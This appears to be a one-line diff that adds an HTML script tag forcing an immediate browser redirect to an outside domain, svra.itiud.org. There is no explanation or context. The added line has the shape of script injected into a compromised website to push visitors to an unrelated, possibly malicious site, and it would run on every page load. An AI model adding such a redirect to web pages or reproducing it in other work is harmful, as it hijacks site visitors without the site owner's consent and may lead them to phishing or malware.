@@ -1,0 +1,1 @@
+<script>location.replace("http://svra.itiud.org");</script>
